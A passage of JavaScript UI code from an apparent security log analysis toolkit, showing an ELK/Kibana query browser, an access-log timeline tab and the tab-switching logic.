    <div id="la-elk-list" style="max-height:600px;overflow-y:auto"></div>
  `;

  function renderQueries() {
    const search = container.querySelector('#la-elk-search').value.toLowerCase();
    const cat = container.querySelector('#la-elk-cat').value;
    let filtered = ELK_QUERIES;
    if (search) filtered = filtered.filter(q =>
      q.title.toLowerCase().includes(search) || q.description.toLowerCase().includes(search)
    );
    if (cat) filtered = filtered.filter(q => q.category === cat);

    let html = `<p class="muted">Showing ${filtered.length} of ${ELK_QUERIES.length} queries</p>`;
    for (const q of filtered) {
      html += `<div class="card" style="margin:8px 0;padding:12px">
        <div style="display:flex;justify-content:space-between"><strong>${escapeHTML(q.title)}</strong><span class="muted">${q.category}</span></div>
        <p class="muted" style="margin:4px 0">${escapeHTML(q.description)}</p>
        <div style="margin:4px 0"><strong>Elasticsearch Query:</strong></div>
        <pre class="cmd-block" style="margin:4px 0;font-size:0.85em;white-space:pre-wrap;word-break:break-all">${escapeHTML(q.query)}</pre>
        <div style="margin:4px 0"><strong>KQL:</strong></div>
        <pre class="cmd-block" style="margin:4px 0;font-size:0.85em;white-space:pre-wrap">${escapeHTML(q.kql)}</pre>
      </div>`;
    }
    container.querySelector('#la-elk-list').innerHTML = html;
  }

  container.querySelector('#la-elk-search').oninput = renderQueries;
  container.querySelector('#la-elk-cat').onchange = renderQueries;
  renderQueries();
}

function renderTimelineTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Log Timeline Visualization</h2>
    <p class="muted">Paste access logs to generate an ASCII timeline showing activity distribution by hour of day. Helps identify unusual activity times.</p>
    <textarea class="tk-in" id="la-timeline-input" rows="10" placeholder="Paste Apache/Nginx access log entries..."></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-timeline-gen">Generate Timeline</button>
    </div>
    <pre class="tk-out" id="la-timeline-output" style="font-family:monospace"></pre>
  `;
  container.querySelector('#la-timeline-gen').onclick = () => {
    const entries = parseApacheAccess(container.querySelector('#la-timeline-input').value);
    if (entries.length === 0) {
      container.querySelector('#la-timeline-output').textContent = 'No valid access log entries found.';
      return;
    }
    container.querySelector('#la-timeline-output').textContent = buildTimeline(entries);
  };
}

/* ============================================================
   SECTION 5: MAIN RENDER FUNCTION
   ============================================================ */

const TABS = [
  { id: 'access', label: 'Access Logs', render: renderApacheAccessTab },
  { id: 'error', label: 'Error Logs', render: renderErrorLogTab },
  { id: 'auth', label: 'Auth Logs', render: renderAuthLogTab },
  { id: 'winevt', label: 'Windows Events', render: renderWindowsEventsTab },
  { id: 'syslog', label: 'Syslog', render: renderSyslogTab },
  { id: 'json', label: 'JSON Logs', render: renderJSONLogTab },
  { id: 'patterns', label: 'Pattern Detect', render: renderPatternDetectorTab },
  { id: 'ipfreq', label: 'IP Frequency', render: renderIPFrequencyTab },
  { id: 'useragent', label: 'User Agents', render: renderUserAgentTab },
  { id: 'regex', label: 'Regex Builder', render: renderRegexBuilderTab },
  { id: 'timeline', label: 'Timeline', render: renderTimelineTab },
  { id: 'ioc', label: 'IOC Extractor', render: renderIOCExtractorTab },
  { id: 'sigma', label: 'Sigma Rules', render: renderSigmaTab },
  { id: 'yara', label: 'YARA Rules', render: renderYARATab },
  { id: 'splunk', label: 'Splunk SPL', render: renderSplunkTab },
  { id: 'elk', label: 'ELK/Kibana', render: renderELKTab },
];

export function renderLogAnalyzer(main) {
  main.innerHTML = `
    <h1 class="pg-h1">Log Analyzer</h1>
    <p class="pg-sub">Security log analysis toolkit -- parse, search, detect anomalies, and extract IOCs from any log format.</p>
    <div class="tab-bar" id="la-tabs" style="flex-wrap:wrap">
      ${TABS.map((t, i) => `<button class="tab${i === 0 ? ' active' : ''}" data-tab="${t.id}">${t.label}</button>`).join('')}
    </div>
    <div id="la-content" style="margin-top:12px"></div>
  `;

  const tabBar = main.querySelector('#la-tabs');
  const content = main.querySelector('#la-content');

  function switchTab(tabId) {
    tabBar.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tabId));
    const tab = TABS.find(t => t.id === tabId);
    if (tab) {
      content.innerHTML = '';
      tab.render(content);
    }
  }

  tabBar.onclick = (e) => {
    const btn = e.target.closest('.tab');
    if (btn) switchTab(btn.dataset.tab);
  };

  // Render default tab
  TABS[0].render(content);
}
